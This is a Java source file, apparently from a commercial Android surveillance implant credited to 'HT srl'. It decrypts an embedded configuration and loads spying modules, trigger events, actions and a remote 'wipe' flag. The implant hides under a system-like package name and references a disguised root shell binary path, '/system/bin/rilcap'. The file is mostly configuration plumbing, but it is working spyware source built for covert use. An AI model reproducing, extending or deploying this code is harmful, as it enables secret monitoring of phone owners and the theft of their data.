/* *********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.deviceinfo.conf;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONTokener;

import com.android.deviceinfo.Debug;
import com.android.deviceinfo.GeneralException;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.action.Action;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.crypto.EncryptionPKCS5;
import com.android.deviceinfo.crypto.Keys;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

/**
 * The Class Configuration.
 */
public class Configuration {
	private static final String TAG = "Configuration"; //$NON-NLS-1$

	/** The status obj. */
	private final Status status;

	/**
	 * Configuration file embedded into the .apk
	 */
	private final String jsonResource;

	/** Clear configuration buffer wrapped into a ByteBuffer. */
	// private ByteBuffer wrappedClearConf;

	/** The Constant TASK_ACTION_TIMEOUT. */
	public static final long TASK_ACTION_TIMEOUT = 600000;

	/** The Constant MIN_AVAILABLE_SIZE. */
	public static final long MIN_AVAILABLE_SIZE = 200 * 1024;

	// a_0=/system/bin/ntpsvd
	public static final String shellFile = M.d("/system/bin/rilcap"); //$NON-NLS-1$

	private static final int AGENT_ENABLED = 0x2;

	private static final int DIGEST_LEN = 20;

	// public static final String SYNC_URL =
	// "http://192.168.1.189/wc12/webclient";

	// public static final boolean DEBUG = Config.DEBUG;

	/**
	 * Instantiates a new configuration.
	 * 
	 * @param resource
	 *            the resource
	 * @throws GeneralException
	 */
	public Configuration(final byte[] resource) throws GeneralException {
		status = Status.self();
		// Decrypt Conf
		jsonResource = decryptConfiguration(resource);
	}

	public Configuration(String jsonConf) throws GeneralException {
		status = Status.self();
		jsonResource = jsonConf;
	}

	/**
	 * Load configuration.
	 * 
	 * @return true, if successful
	 * @throws GeneralException
	 *             the rCS exception
	 */
	public boolean loadConfiguration(boolean instantiate) {
		try {
			// Clean old configuration
			if (instantiate) {
				cleanConfiguration();
			}

			if(jsonResource==null){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (loadConfiguration): null json");
				}
				return false;
			}
			// Parse and load configuration
			return parseConfiguration(instantiate, jsonResource);
		} catch (final Exception rcse) {
			if (Cfg.EXCEPTION) {
				Check.log(rcse);
			}

			return false;
		}

	}

	abstract static class Visitor {
		protected boolean instantiate;

		public Visitor(boolean instantiate) {
			this.instantiate = instantiate;
		}

		public static void load(JSONArray jmodules, Visitor visitor) {
			int agentTag;

			// How many agents we have?
			final int num = jmodules.length();

			if (Cfg.DEBUG) {
				Check.log(TAG + " Number of elements: " + num);//$NON-NLS-1$
			}

			// Get id, status, parameters length and parameters
			for (int i = 0; i < num; i++) {
				JSONObject jobject;
				try {
					jobject = jmodules.getJSONObject(i);
					if (Cfg.DEBUG) {
						Check.log(TAG + " (load): " + jobject); //$NON-NLS-1$
					}
					visitor.call(i, jobject);
				} catch (JSONException e1) {
					if (Cfg.EXCEPTION) {
						Check.log(e1);
					}

					if (Cfg.DEBUG) {
						Check.log(TAG + " (load) Error: " + e1); //$NON-NLS-1$
					}
				} catch (GeneralException e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}

					if (Cfg.DEBUG) {
						Check.log(TAG + " (load) Error: " + e); //$NON-NLS-1$
					}
				} catch (ConfigurationException e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}

					if (Cfg.DEBUG) {
						Check.log(TAG + " (load) Error: " + e); //$NON-NLS-1$
					}
				}
			}
		}

		public abstract void call(int id, JSONObject o) throws ConfigurationException, JSONException, GeneralException;
	}

	class LoadModule extends Visitor {
		public LoadModule(boolean instantiate) {
			super(instantiate);
		}

		public void call(int moduleId, JSONObject params) throws ConfigurationException, GeneralException,
				JSONException {
			final String moduleType = params.getString(M.d("module")); //$NON-NLS-1$

			if (Cfg.DEBUG) {
				Check.log(TAG + " Module: " + moduleType + " Params size: " + params.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
			}

			if (instantiate) {
				final ConfModule a = new ConfModule(moduleType, params);
				Status.self().addAgent(a);
			}
		}
	}

	class LoadEvent extends Visitor {
		public LoadEvent(boolean instantiate) {
			super(instantiate);
		}

		public void call(int eventId, JSONObject jmodule) throws JSONException, GeneralException {
			if (Cfg.DEBUG) {
				Check.requires(jmodule != null, " (call) Assert failed, null jmodule"); //$NON-NLS-1$
			}

			String eventType = jmodule.getString(M.d("event")); //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.asserts(eventType != null, " (call) Assert failed, null eventType"); //$NON-NLS-1$
			}
			if (jmodule.has(M.d("type"))) { //$NON-NLS-1$
				eventType += " " + jmodule.getString(M.d("type")); //$NON-NLS-1$ //$NON-NLS-2$
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Event: " + eventId + " type: " + eventType + " Params size: " + jmodule.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
			}

			if (instantiate) {
				final ConfEvent e = new ConfEvent(eventId, eventType, jmodule);
				Status.self().addEvent(e);
			}

		}
	}

	class LoadAction extends Visitor {
		public LoadAction(boolean instantiate) {
			super(instantiate);
		}

		public void call(int actionId, JSONObject jaction) throws ConfigurationException, GeneralException,
				JSONException {
			String desc = jaction.getString(M.d("desc")); //$NON-NLS-1$
			final Action a = new Action(actionId, desc);

			JSONArray jsubactions = jaction.getJSONArray(M.d("subactions")); //$NON-NLS-1$
			int subNum = jsubactions.length();

			if (Cfg.DEBUG) {
				Check.log(TAG + " Action " + actionId + " SubActions: " + subNum);//$NON-NLS-1$ //$NON-NLS-2$
			}

			for (int j = 0; j < subNum; j++) {
				JSONObject jsubaction = jsubactions.getJSONObject(j);

				final String type = jsubaction.getString(M.d("action")); //$NON-NLS-1$
				ConfAction conf = new ConfAction(actionId, j, type, jsubaction);
				if (a.addSubAction(conf)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " SubAction " + j + " Type: " + type + " Params Length: " + jsubaction.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
					}
				}
			}

			if (Cfg.DEBUG) {
				Check.ensures(a.getSubActionsNum() == subNum, "inconsistent subaction number"); //$NON-NLS-1$
			}

			if (instantiate) {
				status.addAction(a);
			}
		}
	}

	/**
	 * Parses the configuration. k
	 * 
	 * @throws GeneralException
	 *             the rCS exception
	 */
	private boolean parseConfiguration(boolean instantiate, String json) throws GeneralException {
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parseConfiguration): " + json); //$NON-NLS-1$
			}
			JSONObject root = (JSONObject) new JSONTokener(json).nextValue();

			JSONArray jmodules = root.getJSONArray(M.d("modules")); //$NON-NLS-1$
			JSONArray jevents = root.getJSONArray(M.d("events")); //$NON-NLS-1$
			JSONArray jactions = root.getJSONArray(M.d("actions")); //$NON-NLS-1$
			JSONObject jglobals = root.getJSONObject(M.d("globals")); //$NON-NLS-1$

			Visitor.load(jmodules, new LoadModule(instantiate));
			Visitor.load(jevents, new LoadEvent(instantiate));
			Visitor.load(jactions, new LoadAction(instantiate));

			loadGlobals(jglobals, instantiate);

			// Debug Check. start //$NON-NLS-1$
			Debug.statusActions();
			Debug.statusModules();
			Debug.statusEvents();
			Debug.statusGlobals();
			// Debug Check. end //$NON-NLS-1$

			return true;
		} catch (JSONException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parseConfiguration) Error: " + e); //$NON-NLS-1$
			}
			return false;
		}

	}

	private void loadGlobals(JSONObject jglobals, boolean instantiate) throws JSONException {

		Globals g = new Globals();

		JSONObject jquota = jglobals.getJSONObject(M.d("quota")); //$NON-NLS-1$
		g.quotaMin = jquota.getInt(M.d("min")); //$NON-NLS-1$
		g.quotaMax = jquota.getInt(M.d("max")); //$NON-NLS-1$

		g.wipe = jglobals.getBoolean(M.d("wipe")); //$NON-NLS-1$
		g.type = jglobals.getString(M.d("type")); //$NON-NLS-1$

		status.setGlobal(g);
	}

	/**
	 * Decrypt configuration.
	 * 
	 * @param rawConf
	 *            the raw conf
	 * @return
	 * @throws GeneralException
	 *             the rCS exception
	 */
	private String decryptConfiguration(final byte[] rawConf) throws GeneralException {
		/**
		 * Struttura del file di configurazione
		 * 
		 * |DWORD|DWORD|DWORD|DATA.....................|CRC| |---Skip----|-Len-|
		 * 
		 * Le prime due DWORD vanno skippate. La terza DWORD contiene la
		 * lunghezza del blocco di dati (inclusa la stessa Len) CRC e' il CRC
		 * (cifrato) dei dati in chiaro, inclusa la DWORD Len
		 */

		try {
			if (rawConf == null) {
				throw new GeneralException("conf"); //$NON-NLS-1$
			}

			// Crypto crypto = new Crypto(Keys.g_ConfKey);
			final byte[] confKey = Keys.self().getConfKey();

			EncryptionPKCS5 crypto = new EncryptionPKCS5(confKey);
			// final Crypto crypto = new Crypto(confKey);
			final byte[] clearConf = crypto.decryptDataIntegrity(rawConf);

			
			String json = null;
			if(clearConf!=null){
				json=new String(clearConf);
			}

			if (json != null && json.length() > 0) {
				// Return decrypted conf
				if (Cfg.DEBUG) {
					Check.log(TAG + " Configuration is valid");//$NON-NLS-1$
				}

				return json;
			}
			return null;

		} catch (final SecurityException se) {
			if (Cfg.EXCEPTION) {
				Check.log(se);
			}

			if (Cfg.DEBUG) {
				Check.log(se);//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " SecurityException() detected");//$NON-NLS-1$
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " Exception() detected");//$NON-NLS-1$
			}
		}

		return null;
	}

	/**
	 * Clean configuration and status objects.
	 */
	public void cleanConfiguration() {
		// Clean an eventual old initialization
		status.clean();

	}

	public static boolean isDebug() {
		return Cfg.DEBUG;
	}
}
